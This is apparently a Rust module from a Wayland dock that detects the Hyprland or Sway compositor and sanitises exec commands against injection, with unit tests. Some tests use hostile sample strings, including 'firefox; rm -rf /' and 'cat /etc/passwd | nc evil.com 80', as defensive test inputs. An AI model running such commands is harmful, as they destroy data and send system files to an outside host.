mod hyprland;
mod sway;
pub mod traits;
pub mod types;

use crate::error::{DockError, Result};
pub use traits::{Compositor, WmEventStream};
pub use types::{WmClient, WmEvent, WmMonitor, WmWorkspace};

/// Supported compositor backends.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CompositorKind {
    Hyprland,
    Sway,
}

/// CLI `--wm` flag values. Uwsm is a launch wrapper that falls through
/// to auto-detection of the actual compositor.
#[derive(Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum)]
pub enum WmOverride {
    Hyprland,
    Sway,
    /// Universal Wayland Session Manager — launch wrapper, not a compositor.
    Uwsm,
}

/// Auto-detect the running compositor from environment variables.
/// Pass `wm_override` to force a specific backend (from `--wm` flag).
pub fn detect(wm_override: Option<WmOverride>) -> Result<CompositorKind> {
    if let Some(wm) = wm_override {
        match wm {
            WmOverride::Hyprland => return Ok(CompositorKind::Hyprland),
            WmOverride::Sway => return Ok(CompositorKind::Sway),
            WmOverride::Uwsm => {
                crate::launch::set_uwsm_mode(true);
                log::info!("uwsm mode enabled, auto-detecting compositor from environment");
            }
        }
    }

    if std::env::var("HYPRLAND_INSTANCE_SIGNATURE").is_ok() {
        Ok(CompositorKind::Hyprland)
    } else if std::env::var("SWAYSOCK").is_ok() {
        Ok(CompositorKind::Sway)
    } else {
        Err(DockError::NoCompositorDetected)
    }
}

/// Create a compositor backend for the given kind.
pub fn create(kind: CompositorKind) -> Result<Box<dyn Compositor>> {
    match kind {
        CompositorKind::Hyprland => Ok(Box::new(hyprland::HyprlandBackend::new()?)),
        CompositorKind::Sway => Ok(Box::new(sway::SwayBackend::new()?)),
    }
}

/// Detects and creates the compositor backend, exiting the process on failure.
///
/// Shared by all three binaries (dock, drawer, notifications) to avoid duplication.
pub fn init_or_exit(wm_override: Option<WmOverride>) -> Box<dyn Compositor> {
    let kind = match detect(wm_override) {
        Ok(k) => k,
        Err(e) => {
            log::error!("{}", e);
            std::process::exit(1);
        }
    };
    match create(kind) {
        Ok(c) => c,
        Err(e) => {
            log::error!("{}", e);
            std::process::exit(1);
        }
    }
}

/// Sanitizes a command string before passing to compositor exec.
///
/// Strips characters that could be used for command injection via
/// compositor IPC (semicolons chain commands, newlines start new commands,
/// backticks/dollar signs enable substitution).
pub(crate) fn sanitize_exec_command(cmd: &str) -> String {
    cmd.chars()
        .filter(|c| !matches!(c, ';' | '`' | '$' | '|' | '&' | '\n' | '\r'))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_sway_override() {
        assert_eq!(
            detect(Some(WmOverride::Sway)).unwrap(),
            CompositorKind::Sway
        );
    }

    #[test]
    fn detect_hyprland_override() {
        assert_eq!(
            detect(Some(WmOverride::Hyprland)).unwrap(),
            CompositorKind::Hyprland
        );
    }

    #[test]
    fn detect_uwsm_falls_through_to_env() {
        // uwsm is a launch wrapper — detect() should fall through to env auto-detect.
        // In test environment (no Hyprland/Sway), this returns NoCompositorDetected.
        let result = detect(Some(WmOverride::Uwsm));
        assert!(
            matches!(
                result,
                Ok(CompositorKind::Hyprland) | Ok(CompositorKind::Sway)
            ) || matches!(result, Err(DockError::NoCompositorDetected))
        );
        // Reset global side effect
        crate::launch::set_uwsm_mode(false);
    }

    #[test]
    fn sanitize_strips_semicolons() {
        assert_eq!(
            sanitize_exec_command("firefox; rm -rf /"),
            "firefox rm -rf /"
        );
    }

    #[test]
    fn sanitize_strips_backticks() {
        assert_eq!(sanitize_exec_command("echo `whoami`"), "echo whoami");
    }

    #[test]
    fn sanitize_strips_dollar() {
        assert_eq!(sanitize_exec_command("echo $HOME"), "echo HOME");
    }

    #[test]
    fn sanitize_strips_pipes() {
        assert_eq!(
            sanitize_exec_command("cat /etc/passwd | nc evil.com 80"),
            "cat /etc/passwd  nc evil.com 80"
        );
    }

    #[test]
    fn sanitize_strips_ampersand() {
        assert_eq!(sanitize_exec_command("cmd & bg"), "cmd  bg");
    }

    #[test]
    fn sanitize_strips_newlines() {
        assert_eq!(sanitize_exec_command("cmd\nmalicious"), "cmdmalicious");
    }

    #[test]
    fn sanitize_preserves_normal_commands() {
        let cmd = "firefox --new-window https://example.com";
        assert_eq!(sanitize_exec_command(cmd), cmd);
    }

    #[test]
    fn sanitize_preserves_paths_with_spaces() {
        let cmd = "/usr/bin/my app --arg=value";
        assert_eq!(sanitize_exec_command(cmd), cmd);
    }
}
